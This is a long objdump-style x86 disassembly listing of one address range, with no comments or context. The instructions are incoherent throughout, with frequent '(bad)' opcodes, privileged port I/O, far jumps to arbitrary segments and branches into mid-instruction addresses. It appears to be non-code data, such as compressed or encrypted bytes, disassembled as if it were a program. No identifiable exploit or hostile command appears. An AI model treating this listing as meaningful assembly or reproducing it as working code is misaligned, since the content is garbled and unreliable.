  429cf3:	int3   
  429cf4:	xchg   esp,eax
  429cf5:	mov    es,WORD PTR [esi]
  429cf7:	jb     0x429ced
  429cf9:	cmc    
  429cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429cfb:	and    al,bh
  429cfd:	xor    DWORD PTR [ebp+0x5a],edi
  429d00:	cmp    BYTE PTR [edx],ah
  429d02:	adc    BYTE PTR [eax+0x586f00f3],ch
  429d08:	pop    ebx
  429d09:	push   eax
  429d0a:	rcr    DWORD PTR [ecx+esi*4-0x42],1
  429d0e:	enter  0x1e72,0xc0
  429d12:	fs icebp 
  429d14:	sbb    al,0x45
  429d16:	push   es
  429d17:	sub    DWORD PTR [esi-0x7c],esi
  429d1a:	pop    DWORD PTR [edx-0x7e]
  429d1d:	outs   dx,BYTE PTR ds:[esi]
  429d1e:	push   eax
  429d1f:	xor    bl,BYTE PTR [ecx+0x5b]
  429d22:	push   ebx
  429d23:	adc    bh,al
  429d25:	inc    eax
  429d26:	pop    ds
  429d27:	sbb    al,0xd7
  429d29:	mov    ch,ch
  429d2b:	jp     0x429ccf
  429d2d:	ds mov dh,0xe3
  429d30:	test   al,0x3c
  429d32:	loopne 0x429d84
  429d34:	jbe    0x429d73
  429d36:	aam    0x9a
  429d38:	imul   eax,DWORD PTR [ebp+0x75667634],0x20
  429d3f:	mov    esi,0xd9f0e277
  429d44:	add    BYTE PTR [edx],0xa3
  429d47:	dec    eax
  429d48:	and    al,0xe7
  429d4a:	xchg   esi,eax
  429d4b:	js     0x429db9
  429d4d:	hlt    
  429d4e:	lods   eax,DWORD PTR ds:[esi]
  429d4f:	inc    ebx
  429d50:	dec    ecx
  429d51:	xor    al,0xca
  429d53:	cdq    
  429d54:	ds nop
  429d56:	push   fs
  429d58:	(bad)  
  429d59:	dec    ebp
  429d5a:	sbb    eax,0xdec60206
  429d5f:	xchg   esp,eax
  429d60:	mov    esi,0x340876c4
  429d65:	pop    ecx
  429d66:	ds xchg edx,eax
  429d68:	jle    0x429db6
  429d6a:	pop    eax
  429d6b:	lods   eax,DWORD PTR ds:[esi]
  429d6c:	push   0xac52c20f
  429d71:	cld    
  429d72:	inc    eax
  429d73:	or     bh,BYTE PTR [ebp+0x3438fc46]
  429d79:	shl    DWORD PTR [esi+0x8],0x8
  429d7d:	xor    al,BYTE PTR [esi-0x74]
  429d80:	dec    ecx
  429d81:	js     0x429d8d
  429d83:	xchg   ebx,eax
  429d84:	xor    eax,0xe00c8935
  429d89:	pop    esi
  429d8a:	mov    esp,DWORD PTR [eax+0x6d836c7c]
  429d90:	imul   esp,DWORD PTR [ecx+0x58],0x41e6dcc7
  429d97:	int    0x3a
  429d99:	ficomp DWORD PTR [edx-0x2c]
  429d9c:	aad    0x22
  429d9e:	or     al,0xf2
  429da0:	shl    BYTE PTR [edx],0x1f
  429da3:	mov    cs,WORD PTR ds:0x5ceb0a4d
  429da9:	cld    
  429daa:	sbb    cl,BYTE PTR [edx]
  429dac:	das    
  429dad:	loopne 0x429de9
  429daf:	leave  
  429db0:	arpl   WORD PTR ds:[ebx-0xb9577ec],si
  429db7:	ds cmp al,0x75
  429dba:	es push ss
  429dbc:	(bad)  
  429dbd:	xchg   edi,eax
  429dbe:	or     DWORD PTR [edx-0x2c],0x7daa33
  429dc5:	jle    0x429dc9
  429dc7:	sub    dl,cl
  429dc9:	cld    
  429dca:	cli    
  429dcb:	mov    esp,0x6c7560dd
  429dd0:	pop    ds
  429dd1:	or     al,0xf9
  429dd3:	push   ss
  429dd4:	cmp    DWORD PTR [ecx],ebp
  429dd6:	in     al,0xf2
  429dd8:	pop    edx
  429dd9:	inc    ebx
  429dda:	xchg   DWORD PTR [eax+edx*1-0x60],esi
  429dde:	bound  si,DWORD PTR [ebx+eiz*4-0x54]
  429de3:	pusha  
  429de4:	xchg   BYTE PTR ds:0x305ea678,al
  429dea:	push   edx
  429deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429dec:	cmc    
  429ded:	stos   BYTE PTR es:[edi],al
  429dee:	inc    ecx
  429def:	sub    eax,0xe253b410
  429df4:	mov    al,ds:0xb8a2ae9c
  429df9:	sbb    eax,0x26f82840
  429dfe:	pop    eax
  429dff:	xchg   esp,eax
  429e00:	pusha  
  429e01:	repz sahf 
  429e03:	das    
  429e04:	pop    ebp
  429e05:	pop    ds
  429e06:	mov    ah,0xa2
  429e08:	sbb    al,0xcb
  429e0a:	jl     0x429ddc
  429e0c:	cmp    cl,BYTE PTR [esi]
  429e0e:	lea    ebx,[ecx]
  429e10:	add    al,al
  429e12:	mov    bl,0x8d
  429e14:	pop    edx
  429e15:	push   ebx
  429e16:	dec    esi
  429e17:	js     0x429de0
  429e19:	add    al,0x6a
  429e1b:	cmp    bl,BYTE PTR [ebx+0x41]
  429e1e:	inc    edi
  429e1f:	push   ecx
  429e20:	or     DWORD PTR [edx+0x54],0x18
  429e24:	mov    es,WORD PTR [ebx+eiz*1+0x167eec76]
  429e2b:	cld    
  429e2c:	or     DWORD PTR ds:0x71a40ed6,edx
  429e32:	fild   DWORD PTR [eax]
  429e34:	push   0x4b95ebba
  429e39:	imul   edi,DWORD PTR [ebx+0x22],0x58
  429e3d:	push   0x40
  429e3f:	inc    edi
  429e40:	fs pop edx
  429e42:	jo     0x429e8d
  429e44:	je     0x429e03
  429e46:	mov    al,ds:0x67e0fa0a
  429e4b:	in     al,dx
  429e4c:	mov    cl,0xed
  429e4e:	add    bl,al
  429e50:	aad    0x56
  429e52:	or     DWORD PTR [edx-0x1e],edi
  429e55:	cmc    
  429e56:	jb     0x429e24
  429e58:	cli    
  429e59:	xchg   edi,eax
  429e5a:	jne    0x429ea4
  429e5c:	dec    ebp
  429e5d:	or     eax,0xa3101d9e
  429e62:	and    al,0x77
  429e64:	lahf   
  429e65:	add    al,0x8e
  429e67:	lods   al,BYTE PTR ds:[esi]
  429e68:	cli    
  429e69:	loope  0x429eb7
  429e6b:	enter  0x44a6,0x79
  429e6f:	dec    ebx
  429e70:	sub    edi,DWORD PTR [esi]
  429e72:	add    BYTE PTR [ecx-0xe],0xfa
  429e76:	mov    eax,0xc1548021
  429e7b:	mov    bl,BYTE PTR [edi]
  429e7d:	push   es
  429e7e:	jmp    0xeeab9f06
  429e83:	cmc    
  429e84:	les    esp,FWORD PTR [esi+0x56]
  429e87:	fnstenv [eax+0x34]
  429e8a:	jl     0x429e52
  429e8c:	ror    DWORD PTR [edi+0x466c0be0],cl
  429e92:	push   esp
  429e93:	jl     0x429e37
  429e95:	fcomp  QWORD PTR [ebx]
  429e97:	enter  0xc49b,0x4
  429e9b:	lods   al,BYTE PTR ds:[esi]
  429e9c:	call   0x48fa409
  429ea1:	lea    edx,[eax-0x3319776c]
  429ea7:	lods   al,BYTE PTR ds:[esi]
  429ea8:	push   es
  429ea9:	test   al,0xa8
  429eab:	sub    al,al
  429ead:	jnp    0x429e87
  429eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429eb0:	mov    esi,0xd1618e36
  429eb5:	sub    edi,DWORD PTR [edx]
  429eb7:	test   al,0x96
  429eb9:	fcomp  QWORD PTR [edx+0x72]
  429ebc:	add    BYTE PTR [edi-0x5f68aee6],bl
  429ec2:	mov    gs,WORD PTR [ebx-0x43]
  429ec5:	add    BYTE PTR [ebx],0x0
  429ec8:	push   esi
  429ec9:	popf   
  429eca:	pop    esi
  429ecb:	jmp    0xa9b4:0x5022d4c0
  429ed2:	cs cs push es
  429ed5:	iret   
  429ed6:	xchg   edx,eax
  429ed7:	mov    esp,0xbc0d9ed0
  429edc:	sub    BYTE PTR [ebx-0x77db0717],dh
  429ee2:	retf   
  429ee3:	mov    cl,0x50
  429ee5:	rcl    BYTE PTR [eax-0x52],1
  429ee8:	nop
  429ee9:	push   esi
  429eea:	leave  
  429eeb:	mov    ds:0xe90bdccd,al
  429ef0:	and    esi,DWORD PTR [esi]
  429ef2:	push   edx
  429ef3:	inc    esp
  429ef4:	test   BYTE PTR [edx+eax*2-0x4bcce30c],dl
  429efb:	int    0xb6
  429efd:	mov    ch,0x4
  429eff:	mov    bh,0xec
  429f01:	jl     0x429ecd
  429f03:	xchg   edx,eax
  429f04:	xor    DWORD PTR [edx+0x77f40e61],0x2a79b66c
  429f0e:	push   0x0
  429f10:	mov    ebp,0xd62e77a7
  429f15:	mov    dl,0x70
  429f17:	adc    ch,dl
  429f19:	add    BYTE PTR [ecx],ah
  429f1b:	push   ss
  429f1c:	mov    DWORD PTR [ecx],ecx
  429f1e:	xor    al,0x93
  429f20:	out    dx,al
  429f21:	out    0x1e,al
  429f23:	shl    DWORD PTR [ecx+0x6e881435],cl
  429f29:	jmp    0x2a25:0x523acea5
  429f30:	mov    bl,0x49
  429f32:	mov    cl,0x2
  429f34:	sub    al,0x6b
  429f36:	add    al,0x10
  429f38:	xor    al,0xc6
  429f3a:	dec    esi
  429f3b:	add    al,0x54
  429f3d:	sub    BYTE PTR [esi-0x146b8fc2],dh
  429f43:	jbe    0x429ed9
  429f45:	jns    0x429f66
  429f47:	rol    BYTE PTR [edx+0xb43e0b],cl
  429f4d:	jae    0x429eeb
  429f4f:	repnz mov bh,0x66
  429f52:	dec    esi
  429f53:	popa   
  429f54:	lahf   
  429f55:	add    DWORD PTR [edx-0x35bf5198],0xba7c519a
  429f5f:	mov    cl,BYTE PTR [edx]
  429f61:	push   eax
  429f62:	jl     0x429eff
  429f64:	push   0x6c
  429f66:	es repz pop esp
  429f69:	aas    
  429f6a:	adc    al,0x1b
  429f6c:	call   0x981c:0x6aaf448a
  429f73:	mov    bl,0x25
  429f75:	add    BYTE PTR [eax+ebx*8],0x4
  429f79:	or     ecx,DWORD PTR [esi-0x4f]
  429f7c:	jbe    0x429f74
  429f7e:	cmp    ah,BYTE PTR [eax+0x404f9473]
  429f84:	and    eax,edx
  429f86:	mov    al,ds:0x669c4e86
  429f8b:	cmp    al,BYTE PTR [edi-0x15]
  429f8e:	push   eax
  429f8f:	ins    BYTE PTR es:[edi],dx
  429f90:	mov    al,ds:0xa2a616ba
  429f95:	mov    ah,0xe8
  429f97:	cmp    BYTE PTR [eax],al
  429f99:	and    BYTE PTR [esi+0x73b47cc8],0x0
  429fa0:	mov    edi,0xbdba8cd8
  429fa5:	int3   
  429fa6:	dec    edi
  429fa7:	stos   DWORD PTR es:[edi],eax
  429fa8:	cmp    eax,0x64585d0
  429fad:	test   BYTE PTR [ebx+0x70],dl
  429fb0:	std    
  429fb1:	out    0xb4,al
  429fb3:	neg    BYTE PTR [ecx]
  429fb5:	sar    BYTE PTR [edi+0x23],0x68
  429fb9:	jp     0x429ff1
  429fbb:	call   0x1549:0xfa1fc4bd
  429fc2:	adc    al,0xd8
  429fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fc5:	mov    edx,0x598cf632
  429fca:	or     DWORD PTR [ebp-0x13],0xfa06ae4a
  429fd1:	and    eax,0x2d420fac
  429fd6:	mov    edx,0x23003e1a
  429fdb:	repnz mov dh,0xb6
  429fde:	sub    DWORD PTR [eax-0x44],eax
  429fe1:	jge    0x42a003
  429fe3:	jbe    0x429fdd
  429fe5:	daa    
  429fe6:	addr16 into 
  429fe8:	sub    ch,0x1c
  429feb:	jge    0x429fed
  429fed:	(bad)  
  429fee:	push   esi
  429fef:	in     al,dx
  429ff0:	mov    cl,0x50
  429ff2:	shr    BYTE PTR [ebp-0x10],1
  429ff5:	loope  0x429fcd
  429ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ff8:	and    BYTE PTR [esi],dl
  429ffa:	push   0x960a8b45
  429fff:	mov    dl,0x56
  42a001:	sub    BYTE PTR [esi+esi*4-0x7e],al
  42a005:	jl     0x42a014
  42a007:	in     eax,dx
  42a008:	inc    ebx
  42a009:	pop    edx
  42a00a:	loopne 0x42a00c
  42a00c:	test   bh,ch
  42a00e:	sti    
  42a00f:	and    al,0x5f
  42a011:	lods   al,BYTE PTR ds:[esi]
  42a012:	adc    BYTE PTR ds:0x72551935,al
  42a018:	pop    ecx
  42a019:	cmp    al,0xa6
  42a01b:	sub    dh,BYTE PTR [esi]
  42a01d:	fdecstp 
  42a01f:	in     al,0x4a
  42a021:	adc    BYTE PTR [ebp+0x27],0x16
  42a025:	dec    esp
  42a026:	in     al,dx
  42a027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a028:	adc    BYTE PTR [ecx+0x64d8195c],ah
  42a02e:	inc    esi
  42a02f:	imul   esp,DWORD PTR [esp+edx*2+0x67],0x54341515
  42a037:	pop    esi
  42a038:	retf   0xf6a4
  42a03b:	fdivrp st(5),st
  42a03d:	xchg   BYTE PTR [ecx-0x49],ah
  42a040:	mov    al,0xab
  42a042:	mov    ds:0x4fccdf94,eax
  42a047:	out    0xf3,al
  42a049:	push   cs
  42a04a:	jbe    0x42a09c
  42a04c:	pop    eax
  42a04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a04e:	jmp    0x9a1a:0xf3f03df5
  42a055:	pop    ss
  42a056:	ins    DWORD PTR es:[edi],dx
  42a057:	stos   BYTE PTR es:[edi],al
  42a058:	sub    BYTE PTR ds:0x44792294,cl
  42a05e:	xor    al,BYTE PTR [eax]
  42a060:	icebp  
  42a061:	scas   eax,DWORD PTR es:[edi]
  42a062:	fsubr  QWORD PTR [eax]
  42a064:	mov    eax,0xb3c4d66d
  42a069:	out    dx,al
  42a06a:	jl     0x42a03b
  42a06c:	shl    DWORD PTR [ebx+eax*2],cl
  42a06f:	add    ch,al
  42a071:	adc    dl,BYTE PTR [esi+0x2ad91455]
  42a077:	dec    esi
  42a078:	pushf  
  42a079:	stos   BYTE PTR es:[edi],al
  42a07a:	inc    esi
  42a07b:	cs retf 
  42a07d:	test   DWORD PTR [eax+0x1c940819],ebp
  42a083:	mov    esp,DWORD PTR [esi]
  42a085:	retf   0x64d0
  42a088:	ins    DWORD PTR es:[edi],dx
  42a089:	push   ebx
  42a08a:	pusha  
  42a08b:	xor    al,0xf0
  42a08d:	ror    BYTE PTR [edx],cl
  42a08f:	or     ecx,DWORD PTR [esi+0xa66f734]
  42a095:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42a097:	xchg   edx,eax
  42a098:	sub    BYTE PTR [ebp+0x31],dh
  42a09b:	mov    edx,0xe14c99
  42a0a0:	shl    BYTE PTR [esi+0x6c075282],0xd2
  42a0a7:	adc    eax,DWORD PTR [edi]
  42a0a9:	aad    0xb0
  42a0ab:	test   al,0x2c
  42a0ad:	fwait
  42a0ae:	sbb    dl,BYTE PTR [ecx]
  42a0b0:	inc    edi
  42a0b1:	enter  0xf2c2,0xb
  42a0b5:	test   DWORD PTR [eax],eax
  42a0b7:	fisub  DWORD PTR [edx-0x66]
  42a0ba:	cmp    ah,BYTE PTR [edx]
  42a0bc:	xchg   edi,ecx
  42a0be:	push   es
  42a0bf:	stos   BYTE PTR es:[edi],al
  42a0c0:	push   ds
  42a0c1:	dec    esp
  42a0c2:	popf   
  42a0c3:	lahf   
  42a0c4:	cld    
  42a0c5:	xor    ch,BYTE PTR [edx+eax*8]
  42a0c8:	inc    esp
  42a0c9:	pop    ebx
  42a0ca:	stos   DWORD PTR es:[edi],eax
  42a0cb:	mov    dl,0xc
  42a0cd:	out    dx,al
  42a0ce:	xor    ah,cl
  42a0d0:	or     bh,BYTE PTR [ecx]
  42a0d2:	push   ss
  42a0d3:	mov    ebx,0xf46dd45c
  42a0d8:	rcr    eax,1
  42a0da:	pop    esi
  42a0db:	mov    ebx,DWORD PTR [eax+esi*4-0x52]
  42a0df:	jae    0x42a150
  42a0e1:	sahf   
  42a0e2:	jnp    0x42a0f7
  42a0e4:	pop    ss
  42a0e5:	js     0x42a128
  42a0e7:	test   BYTE PTR [ebx+0x27a1ec4d],cl
  42a0ed:	add    DWORD PTR [ebx-0x7b],ebx
  42a0f0:	out    0x52,al
  42a0f2:	xchg   dl,cl
  42a0f4:	or     ecx,ecx
  42a0f6:	jmp    0xeebf:0x8aad99aa
  42a0fd:	xor    bh,ah
  42a0ff:	sub    ah,cl
  42a101:	aad    0x16
  42a103:	push   ebp
  42a104:	mov    ebp,0x7fb906
  42a109:	pop    esi
  42a10a:	pop    edx
  42a10b:	and    esi,esp
  42a10d:	pop    ss
  42a10e:	inc    edx
  42a10f:	jo     0x42a0d3
  42a111:	sub    BYTE PTR [edx-0x6de9da7c],ah
  42a117:	sbb    eax,ebx
  42a119:	popa   
  42a11a:	pop    ebx
  42a11b:	jmp    0x42a0bf
  42a11d:	lods   eax,DWORD PTR ds:[esi]
  42a11e:	push   ss
  42a11f:	or     eax,DWORD PTR [esp+edx*4]
  42a122:	js     0x42a12e
  42a124:	mov    ch,BYTE PTR [ebx]
  42a126:	pop    ss
  42a127:	test   eax,0xdcd2e2a0
  42a12c:	dec    esp
  42a12d:	push   ss
  42a12e:	loopne 0x42a0de
  42a130:	mov    cl,0xb4
  42a132:	inc    eax
  42a133:	mov    ah,0xab
  42a135:	out    dx,al
  42a136:	rcl    BYTE PTR [esi+0x47],1
  42a139:	sub    al,BYTE PTR [edx]
  42a13b:	adc    dh,ch
  42a13d:	mov    al,ds:0x87e9d86b
  42a142:	idiv   dl
  42a144:	push   ecx
  42a145:	(bad)
  42a148:	outs   dx,BYTE PTR ds:[esi]
  42a149:	push   ds
  42a14a:	out    dx,al
  42a14b:	or     DWORD PTR [edx+0x0],ebx
  42a14e:	inc    edi
  42a14f:	ror    DWORD PTR [eax+0xa],0x8
  42a153:	mov    ebx,0xfee3b483
  42a159:	xchg   ecx,eax
  42a15a:	scas   al,BYTE PTR es:[edi]
  42a15b:	pop    es
  42a15c:	inc    ecx
  42a15d:	inc    esp
  42a15e:	in     eax,0x44
  42a160:	push   es
  42a161:	ss pop esp
  42a163:	push   0x4f
  42a165:	mov    ch,0xc8
  42a167:	(bad)  
  42a168:	bound  ecx,QWORD PTR [edi+0x4d825dff]
  42a16e:	lahf   
  42a16f:	(bad)  
  42a170:	jno    0x42a1c4
  42a172:	clc    
  42a173:	or     DWORD PTR [edx],edx
  42a175:	xchg   bh,cl
  42a177:	(bad)  
  42a178:	lods   ax,WORD PTR ds:[esi]
  42a17a:	pop    edx
  42a17b:	mov    al,ds:0x1612049f
  42a180:	or     ah,cl
  42a182:	sbb    cl,BYTE PTR [eax+ebx*8]
  42a185:	mov    cl,BYTE PTR [esi-0x1538b1d6]
  42a18b:	jb     0x42a187
  42a18d:	mov    WORD PTR [esp+eiz*2],es
  42a190:	lock dec ebp
  42a192:	lods   eax,DWORD PTR ds:[esi]
  42a193:	adc    eax,0xdf0a6a42
  42a198:	jo     0x42a174
  42a19a:	inc    eax
  42a19b:	pop    edi
  42a19c:	mov    WORD PTR [eax],es
  42a19e:	into   
  42a19f:	pop    ss
  42a1a0:	push   ecx
  42a1a1:	imul   edi,edx,0xffffff87
  42a1a4:	xchg   esp,eax
  42a1a5:	nop
  42a1a6:	add    al,BYTE PTR [eax]
  42a1a8:	sbb    bl,BYTE PTR [edx-0x79961d56]
  42a1ae:	pop    ebp
  42a1af:	arpl   bp,ax
  42a1b1:	pop    ebx
  42a1b2:	mov    ds:0x9a11c4,eax
  42a1b7:	(bad)  
  42a1b8:	mov    esi,0x7762f970
  42a1bd:	adc    al,0x35
  42a1bf:	dec    ebp
  42a1c0:	add    eax,0xec6c583a
  42a1c5:	sbb    bh,BYTE PTR [edx-0x16]
  42a1c8:	adc    dl,cl
  42a1ca:	ss ds lock jmp 0x42a1d9
  42a1cf:	cs scas al,BYTE PTR es:[edi]
  42a1d1:	ins    DWORD PTR es:[edi],dx
  42a1d2:	fwait
  42a1d3:	lods   eax,DWORD PTR ds:[esi]
  42a1d4:	push   edx
  42a1d5:	dec    ebx
  42a1d6:	or     BYTE PTR [esi+0x20],0x3b
  42a1da:	mov    esi,0x41006f46
  42a1df:	dec    eax
  42a1e0:	jl     0x42a1fd
  42a1e2:	enter  0x1020,0x14
  42a1e6:	mov    ds:0x47a4b587,al
  42a1eb:	shl    BYTE PTR [edx],0x8a
  42a1ee:	mov    ss,WORD PTR [ecx]
  42a1f0:	fmul   DWORD PTR [ebx+edi*4]
  42a1f3:	dec    edx
  42a1f4:	adc    ebp,DWORD PTR [ebp-0x5d31bf3e]
  42a1fa:	push   esi
  42a1fb:	cmp    eax,0x1626ef01
  42a200:	dec    esp
  42a201:	sub    BYTE PTR [eax+0x15],bh
  42a204:	sbb    BYTE PTR [esi],dh
  42a206:	jno    0x42a234
  42a208:	jo     0x42a1c7
  42a20a:	mov    ds:0x8015e3b0,al
  42a20f:	cmp    al,0xd2
  42a211:	or     eax,0x257b02f0
  42a216:	adc    BYTE PTR [ebx+0x29],0xac
  42a21a:	shl    BYTE PTR [edx],0x34
  42a21d:	add    BYTE PTR [ebx-0x68],ah
  42a220:	loope  0x42a1e4
  42a222:	ficomp DWORD PTR [eax-0x7e13a40a]
  42a228:	out    0x6e,al
  42a22a:	mov    dh,0x78
  42a22c:	add    BYTE PTR [edx+ebx*8],dh
  42a22f:	pop    ebx
  42a230:	xor    bl,BYTE PTR [ebp-0x75b6466e]
  42a236:	or     bl,BYTE PTR [edx+0x13]
  42a239:	enter  0x7294,0x70
  42a23d:	popf   
  42a23e:	sub    BYTE PTR [edi+0x4e],al
  42a241:	mov    bh,0xa4
  42a243:	add    BYTE PTR [edx],bh
  42a245:	stos   BYTE PTR es:[edi],al
  42a246:	push   ds
  42a247:	aam    0x8a
  42a249:	xor    BYTE PTR [eax],0xa8
  42a24c:	jmp    0xa802:0x7dc4da5b
  42a253:	xchg   esp,eax
  42a254:	mov    ah,0x2f
  42a256:	mov    DWORD PTR ds:0x41e6ad15,edx
  42a25c:	push   ss
  42a25d:	add    eax,0x2db2d54c
  42a262:	xor    eax,0x71d5d4d1
  42a267:	ins    BYTE PTR es:[edi],dx
  42a268:	push   edi
  42a269:	push   ds
  42a26a:	xchg   ecx,eax
  42a26b:	mov    dh,0x22
  42a26d:	mov    cs:0x54d555de,eax
  42a273:	push   ss
  42a274:	repnz les esi,FWORD PTR ds:0x30f8cf42
  42a27b:	arpl   WORD PTR [eax],ax
  42a27d:	mov    dl,0xa0
  42a27f:	retf   
  42a280:	fidiv  DWORD PTR [esi+0x28]
  42a283:	(bad)  
  42a284:	(bad)  
  42a285:	and    ah,BYTE PTR [edx+esi*4-0xe]
  42a289:	sti    
  42a28a:	(bad)  
  42a28b:	mov    bh,0x81
  42a28d:	add    ah,BYTE PTR [eax]
  42a28f:	and    al,0x0
  42a291:	jne    0x42a2e7
  42a293:	or     BYTE PTR [edx+0x78216a47],0x20
  42a29a:	xor    al,0xdc
  42a29c:	frstor [eax-0x39c8f927]
  42a2a2:	cmp    BYTE PTR [ebx+edx*4+0x10a0c416],dh
  42a2a9:	push   esi
  42a2aa:	push   esp
  42a2ab:	adc    al,0x9a
  42a2ad:	mov    eax,ebp
  42a2af:	lahf   
  42a2b0:	push   edx
  42a2b1:	add    al,0x42
  42a2b3:	mov    dh,0x5a
  42a2b5:	xor    ecx,0x16
  42a2b8:	push   edx
  42a2b9:	dec    ebp
  42a2ba:	mov    eax,0x9a2a8bfd
  42a2bf:	mov    WORD PTR [esp+ebp*4-0x1b],?
  42a2c3:	(bad)  
  42a2c4:	dec    esi
  42a2c5:	stos   BYTE PTR es:[edi],al
  42a2c6:	mov    esi,0x4d1d02b
  42a2cb:	add    eax,0x8884a336
  42a2d0:	inc    esp
  42a2d1:	in     al,0xde
  42a2d3:	out    0x4d,al
  42a2d5:	jo     0x42a328
  42a2d7:	mov    ah,0x29
  42a2d9:	call   0x0:0xc50a4211
  42a2e0:	pop    ebx
  42a2e1:	push   ebp
  42a2e2:	test   BYTE PTR [esi+0x8af7ad6],al
  42a2e8:	stos   BYTE PTR es:[edi],al
  42a2e9:	xlat   BYTE PTR ds:[ebx]
  42a2ea:	inc    ecx
  42a2eb:	inc    ecx
  42a2ec:	mov    bl,0x86
  42a2ee:	push   esp
  42a2ef:	aam    0x9c
  42a2f1:	sub    BYTE PTR [eax],0x5d
  42a2f4:	sub    dl,BYTE PTR [edx+0x2a68254]
  42a2fa:	ins    BYTE PTR es:[edi],dx
  42a2fb:	dec    edi
  42a2fc:	cmp    ebp,DWORD PTR [edx-0x6e]
  42a2ff:	call   0xd88b9f9f
  42a304:	call   0xd02b:0xf9ae80aa
  42a30b:	mov    ebp,0x1600c782
  42a310:	pop    esp
  42a311:	mov    al,0xc3
  42a313:	mov    ds:0xb8182549,al
  42a318:	mov    ah,0x22
  42a31a:	rep stos BYTE PTR es:[edi],al
  42a31c:	adc    DWORD PTR [esi-0x66],esp
  42a31f:	add    BYTE PTR [edx+0x58],al
  42a322:	mov    esp,0xc0d5be79
  42a327:	and    eax,0xc6fe0c88
  42a32c:	jne    0x42a398
  42a32e:	jmp    0x8b2e:0xcac03a70
  42a335:	inc    esi
  42a336:	imul   ecx,DWORD PTR [edi-0x59c3afa8],0x12
  42a33d:	retf   
  42a33e:	mov    ebx,0xfe3a9c2e
  42a343:	mov    al,bl
  42a345:	push   esi
  42a346:	rcr    BYTE PTR [edx-0x64],1
  42a349:	add    al,0x9
  42a34b:	lds    esp,FWORD PTR cs:[eax+0x56]
  42a34f:	adc    dl,cl
  42a351:	test   dl,cl
  42a353:	xor    al,0x58
  42a355:	add    DWORD PTR [esi-0x46],esi
  42a358:	push   ebx
  42a359:	dec    edi
  42a35a:	retf   0x64ab
  42a35d:	xchg   BYTE PTR [ecx-0x5c],ch
  42a360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a361:	dec    ebx
  42a362:	and    DWORD PTR [esi+ebp*2-0x47550846],edi
  42a369:	and    BYTE PTR [edx-0x7b353aa],bh
  42a36f:	push   edx
  42a370:	inc    esp
  42a371:	inc    ebp
  42a372:	and    DWORD PTR [ecx-0x7b41337],0x5e3ac0d2
  42a37c:	pop    ebx
  42a37d:	pop    ebx
  42a37e:	inc    ecx
  42a37f:	cld    
  42a380:	xor    cl,dl
  42a382:	pop    esi
  42a383:	fld    TBYTE PTR [edx]
  42a385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a386:	inc    DWORD PTR [esi+0x3a]
  42a389:	aad    0x60
  42a38b:	sub    dh,BYTE PTR [esi-0x4b]
  42a38e:	out    0xa7,al
  42a390:	retf   0xa6ea
  42a393:	mov    al,ds:0x866ac1aa
  42a398:	push   edi
  42a399:	ins    BYTE PTR es:[edi],dx
  42a39a:	jbe    0x42a40e
  42a39c:	ret    0xb862
  42a39f:	add    eax,0xc25847b4
  42a3a4:	repnz push 0xffffffeb
  42a3a7:	push   esi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0x56]
  42a3ab:	les    esi,FWORD PTR [esp+ecx*8+0x604d8883]
  42a3b2:	jne    0x42a3e8
  42a3b4:	sbb    al,0x8d
  42a3b6:	mov    bl,BYTE PTR [edx+eiz*8]
  42a3b9:	sbb    al,0x70
  42a3bb:	or     eax,0x7c4d4d55
  42a3c0:	mov    al,ds:0xd90c5e52
  42a3c5:	sahf   
  42a3c6:	inc    eax
  42a3c7:	imul   eax,DWORD PTR [edx-0x3b7bfaf3],0x38
  42a3ce:	pop    edx
  42a3cf:	adc    al,0x48
  42a3d1:	pop    eax
  42a3d2:	pop    ss
  42a3d3:	xor    al,0x43
  42a3d5:	test   DWORD PTR [ebx-0xb05efc0],eax
  42a3db:	xor    DWORD PTR [esi],ecx
  42a3dd:	sbb    ebp,DWORD PTR [ebp+ebp*8+0x134578]
  42a3e4:	gs dec eax
  42a3e6:	jns    0x42a3ce
  42a3e8:	call   0xf95756b9
  42a3ed:	fwait
  42a3ee:	pop    ebp
  42a3ef:	int    0x1e
  42a3f1:	adc    al,BYTE PTR [eax-0x8]
  42a3f4:	inc    ecx
  42a3f5:	out    dx,al
  42a3f6:	push   ss
  42a3f7:	mov    ds:0x697b9856,al
  42a3fc:	ins    DWORD PTR es:[edi],dx
  42a3fd:	sbb    eax,0x3434e94e
  42a402:	inc    ebp
  42a403:	fsubr  DWORD PTR [esi]
  42a405:	jne    0x42a3b9
  42a407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a408:	inc    ebx
  42a409:	add    DWORD PTR [ecx-0x3],ebx
  42a40c:	jbe    0x42a44c
  42a40e:	(bad)  
  42a40f:	std    
  42a410:	mov    ah,0xe0
  42a412:	or     al,al
  42a414:	ins    BYTE PTR es:[edi],dx
  42a415:	sub    ch,BYTE PTR [eax-0x6b]
  42a418:	shl    BYTE PTR [edx],0x2c
  42a41b:	jecxz  0x42a3e8
  42a41d:	push   0xcc7a5e
  42a422:	push   esp
  42a423:	adc    BYTE PTR [eax],0x16
  42a426:	lock ins BYTE PTR es:[edi],dx
  42a428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a429:	or     eax,0xa78ce62a
  42a42e:	and    al,BYTE PTR cs:[eax+0x59]
  42a432:	dec    edx
  42a433:	mov    ah,0x81
  42a435:	jo     0x42a43f
  42a437:	or     al,0x46
  42a439:	adc    DWORD PTR [edx-0x68],ecx
  42a43c:	fmul   DWORD PTR [ebp+0x3ccad087]
  42a442:	mov    eax,0xda93df4
  42a447:	fcmovnbe st,st(0)
  42a449:	pusha  
  42a44a:	jp     0x42a478
  42a44c:	sub    eax,0xf406c35c
  42a451:	push   0xb4aacdb0
  42a456:	lea    esi,[eax+0x10]
  42a459:	push   ecx
  42a45a:	add    DWORD PTR [eax+eiz*1],0x7514d657
  42a461:	sub    al,0x60
  42a463:	fwait
  42a464:	sbb    eax,0x9b04ed8
  42a469:	xchg   DWORD PTR [edx-0x53],ebp
  42a46c:	adc    ch,BYTE PTR [ebp+0x4d]
